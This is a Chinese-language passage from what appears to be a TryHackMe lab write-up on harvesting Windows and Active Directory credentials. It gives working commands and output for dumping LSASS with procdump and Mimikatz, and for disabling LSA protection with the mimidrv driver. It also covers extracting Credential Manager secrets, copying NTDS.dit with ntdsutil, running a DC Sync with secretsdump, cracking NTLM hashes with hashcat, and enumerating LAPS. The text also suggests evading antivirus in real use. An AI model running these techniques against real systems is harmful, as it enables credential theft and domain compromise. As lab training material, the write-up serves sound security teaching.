+<p>请注意，我们使用了从 Windows 注册表中提取的 SAM 和系统文件。 <code>-sam</code> 参数用于指定 Windows 机器上转储的 sam 文件的路径。 “-system”参数用于系统文件的路径。我们在命令末尾使用“LOCAL”参数来解密本地 SAM 文件，因为该工具可以处理其他类型的解密。</p>
+<p>请注意，如果我们将输出与从 Metasploit 的 Hashdump 获得的 NTLM 哈希值进行比较，结果会有所不同。原因是其他帐户属于 Active Directory，它们的信息<strong>未</strong>存储在我们转储的系统文件中。要解密它们，我们需要从 Windows 文件中转储 SECURITY 文件，其中包含解密 Active Directory 帐户所需的文件。</p>
+<p>一旦我们获得了 NTLM 哈希值，如果它们是可猜测的，我们可以尝试使用 Hashcat 来破解它们，或者我们可以使用不同的技术来使用哈希值来模拟用户。</p>
+<h1 id="Local-Security-Authority-Subsystem-Service-LSASS"><a href="#Local-Security-Authority-Subsystem-Service-LSASS" class="headerlink" title="Local Security Authority Subsystem Service (LSASS)"></a>Local Security Authority Subsystem Service (LSASS)</h1><p>什么是LSASS？</p>
+<p>本地安全机构服务器服务 (LSASS) 是一个 Windows 进程，用于处理操作系统安全策略并在系统上强制执行。它验证登录帐户并确保密码、哈希值和 Kerberos 票证。 Windows 系统将凭据存储在 LSASS 进程中，使用户能够访问网络资源，例如文件共享、SharePoint 站点和其他网络服务，而无需在每次用户连接时输入凭据。</p>
+<p>因此，LSASS 进程对于红队来说是一个诱人的目标，因为它存储有关用户帐户的敏感信息。 LSASS 通常被滥用来转储凭据以提升权限、窃取数据或横向移动。幸运的是，如果我们有管理员权限，我们可以转储 LSASS 的进程内存。 Windows 系统允许我们创建转储文件，即给定进程的快照。这可以通过桌面访问 (GUI) 或命令提示符来完成。这种攻击在 MITRE ATT&amp;CK 框架中定义为“<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1003/001/">操作系统凭证转储：LSASS 内存 (T1003)</a>”。</p>
+<p>图形用户界面 (GUI)</p>
+<p>要使用 GUI 转储任何正在运行的 Windows 进程，请打开任务管理器，然后从“详细信息”选项卡中找到所需的进程，右键单击它，然后选择“创建转储文件”。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/1af2123f694b7386364b53ae6259b8de.png" alt="Dumping lsass.exe process Using Task Manager"></p>
+<p>转储过程完成后，将显示一条弹出消息，其中包含转储文件的路径。现在复制该文件并将其传输到 AttackBox 以离线提取 NTLM 哈希值。</p>
+<p><strong>注意：</strong>如果我们在提供的虚拟机上尝试此操作，则第一次运行时您应该会收到错误，直到我们在此任务后面的 <strong>Protected LSASS</strong> 部分修复注册表值。</p>
+<p>将转储的进程复制到 Mimikatz 文件夹。</p>
+<p>​            Copying the LSASS Dumped file</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">   C:\Users\Administrator&gt;copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP</span><br><span class="line">1 file(s) copied.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>系统内部套件</p>
+<p>如果我们无法使用 GUI，则转储进程的另一种方法是使用 ProcDump。 ProcDump 是一个从命令提示符运行的 Sysinternals 进程转储实用程序。 SysInternals Suite 已安装在提供的计算机中，位于以下路径：<code>c:\Tools\SysinternalsSuite</code></p>
+<p>我们可以指定一个正在运行的进程（在我们的例子中是 lsass.exe）进行转储，如下所示：</p>
+<p>​            Dumping the LSASS Process using procdump.exe </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           c:\&gt;c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump</span><br><span class="line"></span><br><span class="line">ProcDump v10.0 - Sysinternals process dump utility</span><br><span class="line">Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">[09:09:33] Dump 1 initiated: c:\Tools\Mimikatz\lsass_dump-1.dmp</span><br><span class="line">[09:09:33] Dump 1 writing: Estimated dump file size is 162 MB.</span><br><span class="line">[09:09:34] Dump 1 complete: 163 MB written in 0.4 seconds</span><br><span class="line">[09:09:34] Dump count reached.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>请注意，转储过程正在写入磁盘。转储 LSASS 进程是对手使用的一项已知技术。因此，反病毒产品可能会将其标记为恶意。在现实世界中，您可能会更有创意，编写代码来加密或实现绕过反病毒产品的方法。</p>
+<p>MImikatz</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> 是一个众所周知的工具，用于使用各种技术从内存中提取密码、哈希值、PIN 和 Kerberos 票证。 Mimikatz 是一种后利用工具，可以实现其他有用的攻击，例如传递哈希、传递票证或构建 Golden Kerberos 票证。 Mimikatz 处理操作系统内存来访问信息。因此，它需要管理员和系统权限才能转储内存并提取凭据。</p>
+<p>我们将使用“Mimikatz”工具来提取 lsass.exe 进程的内存转储。我们为您提供了必要的工具，可以在以下位置找到它们：<code>c:\Tools\Mimikatz</code>。</p>
+<p>请记住，LSASS 进程作为系统运行。因此，为了访问用户的哈希值，我们需要系统或本地管理员权限。因此，打开命令提示符并以管理员身份运行它。然后，执行 mimikatz 二进制文件，如下所示：</p>
+<p>​            Runing mimikatz With Admin Privielges</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Tools\Mimikatz&gt; mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43</span><br><span class="line"> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz # </span><br></pre></td></tr></tbody></table></figure>
+
+<p>在转储内存以获取已兑现的凭据和哈希值之前，我们需要启用 SeDebugPrivilege 并检查当前的内存访问权限。可以通过执行“privilege::debug”命令来完成，如下所示，</p>
+<p>​            Checking the Current Permission to Access Memory </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           mimikatz # privilege::debug</span><br><span class="line">Privilege '20' OK</span><br></pre></td></tr></tbody></table></figure>
+
+<p>授予权限后，我们可以使用 sekurlsa::logonpasswords 访问内存以转储 lsass.exe 进程中所有缓存的密码和哈希值。如果我们在提供的虚拟机上尝试此操作，它将无法工作，直到我们在下一节中修复它。</p>
+<p>​            Dumping the Stored Clear-text Passwords</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           mimikatz # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 515377 (00000000:0007dd31)</span><br><span class="line">Session           : RemoteInteractive from 3</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : THM</span><br><span class="line">Logon Server      : CREDS-HARVESTIN</span><br><span class="line">Logon Time        : 6/3/2022 8:30:44 AM</span><br><span class="line">SID               : S-1-5-21-1966530601-3185510712-10604624-500</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : THM</span><br><span class="line">         * NTLM     : 98d3a787a80d08385cea7fb4aa2a4261</span><br><span class="line">         * SHA1     : 64a137cb8178b7700e6cffa387f4240043192e72</span><br><span class="line">         * DPAPI    : bc355c6ce366fdd4fd91b54260f9cf70</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Mimikatz 列出了许多有关帐户和机器的信息。如果我们仔细检查管理员用户的主要部分，我们可以看到我们有一个 NTLM 哈希。</p>
+<p><strong>注意</strong> 要获取用户的哈希值，用户（受害者）必须已登录到系统，并且用户的凭据已被缓存。</p>
+<p>受保护的LSASS</p>
+<p>2012 年，Microsoft 实施了 LSA 保护，以防止 LSASS 被访问以从内存中提取凭据。此任务将展示如何使用 Mimikatz 禁用 LSA 保护并从内存中转储凭证。要启用LSASS保护，我们可以将<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>中的注册表RunAsPPL DWORD值修改为1。</p>
+<p>步骤与上一节类似，以管理员权限运行 Mimikatz 执行文件并启用调试模式。如果启用了 LSA 保护，执行“sekurlsa::logonpasswords”命令时会出现错误。</p>
+<p>​            Failing to Dump Stored Password Due to the LSA Protection</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           mimikatz # sekurlsa::logonpasswords</span><br><span class="line">ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>该命令返回 0x00000005 错误代码消息（访问被拒绝）。幸运的是，Mimikatz 提供了一个 mimidrv.sys 驱动程序，该驱动程序在内核级别工作以禁用 LSA 保护。我们可以通过执行“!+”将其导入Mimikatz，如下所示，</p>
+<p>​            Loading the mimidrv Driver into Memory</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           mimikatz # !+</span><br><span class="line">[*] 'mimidrv' service not present</span><br><span class="line">[+] 'mimidrv' service successfully registered</span><br><span class="line">[+] 'mimidrv' service ACL to everyone</span><br><span class="line">[+] 'mimidrv' service started</span><br></pre></td></tr></tbody></table></figure>
+
+<p>注意：如果此操作因“isFileExist”错误而失败，请退出 mimikatz，导航到“C:\Tools\Mimikatz\”并再次运行该命令。</p>
+<p>加载驱动程序后，我们可以通过执行以下 Mimikatz 命令来禁用 LSA 保护：</p>
+<p>​            Removing the LSA Protection</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           mimikatz # !processprotect /process:lsass.exe /remove</span><br><span class="line">Process : lsass.exe</span><br><span class="line">PID 528 -&gt; 00/00 [0-0-0]</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在，如果我们尝试再次运行“sekurlsa::logonpasswords”命令，它必须成功执行并显示内存中缓存的凭据。</p>
+<h1 id="Windows-Credential-Manager"><a href="#Windows-Credential-Manager" class="headerlink" title="Windows Credential Manager"></a>Windows Credential Manager</h1><p>此任务介绍 Windows 凭据管理器，并讨论利用它来转储系统凭据的技术。</p>
+<p>什么是凭证管理器？</p>
+<p>凭据管理器是一项 Windows 功能，用于存储网站、应用程序和网络的登录敏感信息。它包含登录凭据，例如用户名、密码和互联网地址。凭证类别有四种：</p>
+<ul>
+<li>Web 凭据包含存储在 Internet 浏览器或其他应用程序中的身份验证详细信息。</li>
+<li>Windows 凭据包含 Windows 身份验证详细信息，例如 NTLM 或 Kerberos。</li>
+<li>通用凭据包含基本身份验证详细信息，例如明文用户名和密码。</li>
+<li>基于证书的凭据：基于认证的详细信息。</li>
+</ul>
+<p>请注意，身份验证详细信息存储在用户的文件夹中，并且不会在 Windows 用户帐户之间共享。然而，它们被缓存在内存中。</p>
+<p>访问凭证管理器</p>
+<p>我们可以通过 GUI（控制面板 -&gt; 用户帐户 -&gt; 凭据管理器）或命令提示符访问 Windows 凭据管理器。在此任务中，重点将更多地放在 GUI 不可用的命令提示符场景上。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2ee895dc640303b236e795c1f7e5df7a.png" alt="Windows Credential Manager"></p>
+<p>我们将使用 Microsoft 凭据管理器“vaultcmd”实用程序。让我们开始枚举是否有任何存储的凭据。首先，我们列出 Windows 目标中当前可用的 Windows 保管库。</p>
+<p>​            Listing the Available Credentials from the Credentials Manager</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Users\Administrator&gt;vaultcmd /list</span><br><span class="line">Currently loaded vaults:</span><br><span class="line">        Vault: Web Credentials</span><br><span class="line">        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28</span><br><span class="line">        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28</span><br><span class="line"></span><br><span class="line">        Vault: Windows Credentials</span><br><span class="line">        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29</span><br><span class="line">        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault</span><br></pre></td></tr></tbody></table></figure>
+
+<p>默认情况下，Windows 有两个保管库，一个用于 Web，另一个用于 Windows 计算机凭据。上面的输出确认我们有两个默认的保管库。</p>
+<p>让我们通过使用“/listproperties”运行Vaultcmd命令来检查Web凭据保管库中是否有任何存储的凭据。</p>
+<p>检查“Web 凭据”中是否有任何存储的凭据。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Users\Administrator&gt;VaultCmd /listproperties:"Web Credentials"</span><br><span class="line">Vault Properties: Web Credentials</span><br><span class="line">Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28</span><br><span class="line">Number of credentials: 1</span><br><span class="line">Current protection method: DPAPI</span><br></pre></td></tr></tbody></table></figure>
+
+<p>输出显示我们在指定的保管库中存储了一份凭证。现在让我们尝试列出有关存储的凭据的更多信息，如下所示，</p>
+<p>​            Listing Credentials Details for “Web Credentials”</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Users\Administrator&gt;VaultCmd /listcreds:"Web Credentials"</span><br><span class="line">Credentials in vault: Web Credentials</span><br><span class="line"></span><br><span class="line">Credential schema: Windows Web Password Credential</span><br><span class="line">Resource: internal-app.thm.red</span><br><span class="line">Identity: THMUser Saved By: MSEdge</span><br><span class="line">Hidden: No</span><br><span class="line">Roaming: Yes </span><br></pre></td></tr></tbody></table></figure>
+
+<p>凭证转储</p>
+<p>VaultCmd 无法显示密码，但我们可以依赖其他 PowerShell 脚本，例如 <a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials">Get-WebCredentials.ps1</a>，它已包含在附加的 VM 中。</p>
+<p>确保使用旁路策略执行 PowerShell，将其作为模块导入，如下所示，</p>
+<p>​            Getting Clean-text Password from Web Credentials</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Users\Administrator&gt;powershell -ex bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Users\Administrator&gt; Import-Module C:\Tools\Get-WebCredentials.ps1</span><br><span class="line">PS C:\Users\Administrator&gt; Get-WebCredentials</span><br><span class="line"></span><br><span class="line">UserName  Resource             Password     Properties</span><br><span class="line">--------  --------             --------     ----------</span><br><span class="line">THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>输出显示我们获得了访问内部应用程序的用户名和密码。</p>
+<p>运行方式</p>
+<p>利用存储的凭据的另一种方法是使用 RunAs。 RunAs是一个命令行内置工具，允许在不同用户的权限下运行Windows应用程序或工具。 RunAs 工具具有可在 Windows 系统中使用的各种命令参数。 “/savecred”参数允许您将用户的凭据保存在 Windows 凭据管理器（在 Windows 凭据部分下）中。因此，下次我们以同一用户身份执行时，runas 将不会要求输入密码。</p>
+<p>让我们将其应用到连接的 Windows 计算机上。枚举存储的凭据的另一种方法是使用“cmdkey”，它是一个用于创建、删除和显示存储的 Windows 凭据的工具。通过提供“/list”参数，我们可以显示所有存储的凭据，或者我们可以指定凭据以显示更多详细信息“/list:computername”。</p>
+<p>​            Enumerating for Stored Windows Credentials</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Users\thm&gt;cmdkey /list</span><br><span class="line"></span><br><span class="line">Currently stored credentials:</span><br><span class="line"></span><br><span class="line">    Target: Domain:interactive=thm\thm-local</span><br><span class="line">    Type: Domain Password</span><br><span class="line">    User: thm\thm-local</span><br></pre></td></tr></tbody></table></figure>
+
+<p>输出显示我们有一个存储为“thm\thm-local”用户的域密码。请注意，存储的凭据也可以用于其他服务器。现在让我们使用 runas 以“thm-local”用户身份执行 Windows 应用程序。</p>
+<p>​            Run CMD.exe As a User with the /savecred argument</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Users\thm&gt;runas /savecred /user:THM.red\thm-local cmd.exe</span><br><span class="line">Attempting to start cmd.exe as user "THM.red\thm-local" ...</span><br></pre></td></tr></tbody></table></figure>
+
+<p>将弹出一个新的 cmd.exe，并显示可供使用的命令提示符。现在运行 whoami 命令以确认我们正在所需的用户下运行。在<code>c:\Users\thm-local\Saved Games\flag.txt</code>中有一个flag，尝试阅读它并回答下面的问题。</p>
+<p>mimikatz</p>
+<p>Mimikatz 是一个可以从内存中转储存储在凭证管理器中的明文密码的工具。这些步骤与上一节（内存转储）中显示的步骤类似，但我们可以指定仅这次显示凭据管理器部分。</p>
+<p>Dumping Memory for Credentials Manager</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Users\Administrator&gt;c:\Tools\Mimikatz\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59</span><br><span class="line"> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege '20' OK</span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::credman</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>
+
+<p>将此技术应用于所连接的机器并回答以下问题。</p>
+<p>本任务中讨论的技术也可以通过其他工具来完成，例如 Empire、Metasploit 等。您可以进行自己的研究来扩展您的知识。</p>
+<h1 id="Domain-Controller"><a href="#Domain-Controller" class="headerlink" title="Domain Controller"></a>Domain Controller</h1><p>此任务讨论本地和远程转储域控制器哈希所需的步骤。</p>
+<p>NTDS域控制器</p>
+<p>新技术目录服务 (NTDS) 是一个包含所有 Active Directory 数据的数据库，包括对象、属性、凭据等。NTDS.DTS 数据由三个表组成，如下所示：</p>
+<ul>
+<li>模式表：它包含对象的类型及其关系。</li>
+<li>链接表：它包含对象的属性及其值。</li>
+<li>数据类型：包含用户和组。</li>
+</ul>
+<p> NTDS 默认位于“C:\Windows\NTDS”，并且经过加密以防止从目标计算机提取数据。不允许从正在运行的计算机访问 NTDS.dit 文件，因为该文件由 Active Directory 使用并被锁定。但是，有多种方法可以访问它。此任务将讨论如何使用 ntdsutil 和 Diskshadow 工具获取 NTDS 文件的副本，以及最后如何转储文件的内容。需要注意的是，解密 NTDS 文件需要系统启动密钥来尝试解密存储在“SECURITY”文件系统中的 LSA 隔离凭据。因此，我们还必须转储包含所有解密所需文件的安全文件。</p>
+<p>Ntdsutil</p>
+<p>Ntdsutil 是一个 Windows 实用程序，用于管理和维护 Active Directory 配置。它可以用于各种场景，例如</p>
+<ul>
+<li>恢复 Active Directory 中已删除的对象。</li>
+<li>对AD数据库进行维护。</li>
+<li>活动目录快照管理。</li>
+<li>设置目录服务还原模式 (DSRM) 管理员密码。</li>
+</ul>
+<p>有关 Ntdsutil 的更多信息，您可以访问 Microsoft 文档[页面](<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-</a> 2012/cc753343(v=ws.11))。</p>
+<p>本地转储（无凭证）</p>
+<p>如果您没有可用的凭据但具有域控制器的管理员访问权限，通常会执行此操作。因此，我们将依靠Windows实用程序转储NTDS文件并离线破解它们。作为一个要求，首先，我们假设我们拥有域控制器的管理员访问权限。</p>
+<p>要成功转储 NTDS 文件的内容，我们需要以下文件：</p>
+<ul>
+<li>C:\Windows\NTDS\ntds.dit</li>
+<li>C:\Windows\System32\config\SYSTEM</li>
+<li>C:\Windows\System32\config\SECURITY</li>
+</ul>
+<p>以下是一个单行 PowerShell 命令，用于使用“C:\temp”目录中的 Ntdsutil 工具转储 NTDS 文件。</p>
+<p>​            Dumping the content of the NTDS file from the Victim Machine</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在，如果我们检查“c:\temp”目录，我们会看到两个文件夹：Active Directory 和registry，其中包含我们需要的三个文件。将它们传输到 AttackBox 并运行 Secretsdump.py 脚本以从转储的内存文件中提取哈希值。</p>
+<p> 本地从 NTDS 中提取哈希值</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local</span><br></pre></td></tr></tbody></table></figure>
+
+<p>远程转储（带凭证）</p>
+<p>在上一节中，我们讨论了如何在没有凭据的情况下从内存中获取哈希值。在此任务中，我们将展示如何远程转储系统和域控制器哈希值，这需要凭据，例如密码或 NTLM 哈希值。我们还需要具有域控制器管理访问权限或特殊权限的用户凭据，如 DC 同步部分中所述。</p>
+<p>DC Sync</p>
+<p>DC 同步是一种在 Active Directory 环境中执行的流行攻击，用于远程转储凭据。当具有以下 AD 权限的帐户（具有必要权限的特殊帐户）或 AD 管理员帐户受到威胁时，此攻击就会起作用：</p>
+<ul>
+<li>复制目录更改</li>
+<li>复制目录全部更改</li>
+<li>复制过滤集中的目录更改</li>
+</ul>
+<p>攻击者利用这些配置来执行域复制，通常称为“DC 同步”或域控制器同步。有关 DC Sync 攻击的更多信息，您可以访问 THM <a target="_blank" rel="noopener" href="https://tryhackme.com/room/persistingad">Persisting AD</a> 房间（任务 2）。</p>
+<p>持久AD机房使用Mimikatz工具执行DC同步攻击。让我们使用不同的工具（例如 Impacket SecretsDump 脚本）来演示攻击。</p>
+<p> 执行 DC 同步攻击</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/&lt;AD_Admin_User&gt;@MACHINE_IP </span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::</span><br><span class="line">thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::</span><br></pre></td></tr></tbody></table></figure>
+
+<p>让我们进一步解释一下该命令。</p>
+<ul>
+<li><code>-just-dc</code> 参数用于提取 NTDS 数据。</li>
+<li><code>thm.red/AD_Admin_User</code> 是经过身份验证的域用户，格式为（域/用户）。</li>
+</ul>
+<p>请注意，如果我们只想转储 NTLM 哈希值，那么我们可以使用“-just-dc-ntlm”参数，如下所示，</p>
+<p>​            The DC Sync Attack to Dump NTLM Hashes</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/&lt;AD_Admin_User&gt;@MACHINE_IP</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一旦我们获得了哈希值，我们就可以使用特定用户的哈希值来冒充他，或者使用破解工具（例如“hashcat”）来破解哈希值。我们可以使用 hashcat <code>-m 1000</code> 模式来破解 Windows NTLM 哈希值，如下所示：</p>
+<p>​            Cracking the Hashes</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@machine$ hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Local-Administrator-Password-Solution-LAPS"><a href="#Local-Administrator-Password-Solution-LAPS" class="headerlink" title="Local Administrator Password Solution (LAPS)"></a>Local Administrator Password Solution (LAPS)</h1><p>此任务讨论如果配置并启用 LAPS 功能，如何在 Active Directory 环境中枚举和获取本地管理员密码。</p>
+<p>组策略首选项 (GPP)</p>
+<p>Windows 操作系统有一个内置管理员帐户，可以使用密码进行访问。在拥有多台计算机的大型 Windows 环境中更改密码具有挑战性。因此，Microsoft 实施了一种使用组策略首选项 (GPP) 跨工作站更改本地管理员帐户的方法。</p>
+<p>GPP 是一种允许管理员使用嵌入式凭据创建域策略的工具。部署 GPP 后，会在 SYSVOL 文件夹中创建不同的 XML 文件。 SYSVOL 是 Active Directory 的重要组件，它在 NTFS 卷上创建一个共享目录，所有经过身份验证的域用户都可以通过读取权限访问该目录。</p>
+<p>问题是 GPP 相关 XML 文件包含使用 AES-256 位加密进行加密的密码。当时，加密已经足够好了，直到微软以某种方式在[MSDN]上发布了其私钥。由于域用户可以读取 SYSVOL 文件夹的内容，因此解密存储的密码变得很容易。破解SYSVOL加密密码的工具之一是<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword</a>。</p>
+<p>本地管理员密码解决方案 (LAPS)</p>
+<p>2015 年，Microsoft 删除了在 SYSVOL 文件夹中存储加密密码的做法。它推出了本地管理员密码解决方案 (LAPS)，该解决方案提供了一种更安全的方法来远程管理本地管理员密码。</p>
+<p>新方法包括 Active Directory 中计算机对象的两个新属性（ms-mcs-AdmPwd 和 ms-mcs-AdmPwdExpirationTime）。 <code>ms-mcs-AdmPwd</code> 属性包含本地管理员的明文密码，而 <code>ms-mcs-AdmPwdExpirationTime</code> 包含重置密码的过期时间。 LAPS 使用“admpwd.dll”更改本地管理员密码并更新“ms-mcs-AdmPwd”的值。</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ecdb1fcaee158d79297978a49d52b9dd.png" alt="Computer Objects Attributes"></p>
+<p>枚举 LAPS</p>
+<p>提供的虚拟机启用了 LAPS，所以让我们开始枚举它。首先，我们检查目标计算机上是否安装了 LAPS，这可以通过检查“admpwd.dll”路径来完成。</p>
+<p>​            Enumerating for LAPS        </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           C:\Users\thm&gt;dir "C:\Program Files\LAPS\CSE"</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is A8A4-C362</span><br><span class="line"></span><br><span class="line"> Directory of C:\Program Files\LAPS\CSE</span><br><span class="line"></span><br><span class="line">06/06/2022  01:01 PM              .</span><br><span class="line">06/06/2022  01:01 PM              ..</span><br><span class="line">05/05/2021  07:04 AM           184,232 AdmPwd.dll</span><br><span class="line">               1 File(s)        184,232 bytes</span><br><span class="line">               2 Dir(s)  10,306,015,232 bytes free</span><br></pre></td></tr></tbody></table></figure>
+
+<p>输出确认我们的机器上有 LAPS。让我们检查一下可用于 <code>AdmPwd</code> cmdlet 的可用命令，如下所示：</p>
+<p>​            Listing the available PowerShell cmdlets for LAPS        </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           PS C:\Users\thm&gt; Get-Command *AdmPwd*</span><br><span class="line"></span><br><span class="line">CommandType     Name                                               Version    Source</span><br><span class="line">-----------     ----                                               -------    ------</span><br><span class="line">Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS</span><br><span class="line">Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS</span><br><span class="line">Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS</span><br><span class="line">Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS</span><br><span class="line">Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS</span><br><span class="line">Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS</span><br><span class="line">Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS</span><br><span class="line">Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>
+
+<p>接下来，我们需要找到哪个 AD 组织单元 (OU) 具有处理 LAPS 的“ExtendedRightHolder”属性。我们将使用“Find-AdmPwdExtendedRights”cmdlet 来提供正确的 OU。请注意，获取可用 OU 可以在枚举步骤中完成。本例中我们的 OU 目标是“THMorg”。您可以使用“-Identity *”参数列出所有可用的 OU。</p>
+<p>​            Finding Users with AdmPwdExtendedRights Attribute        </p>
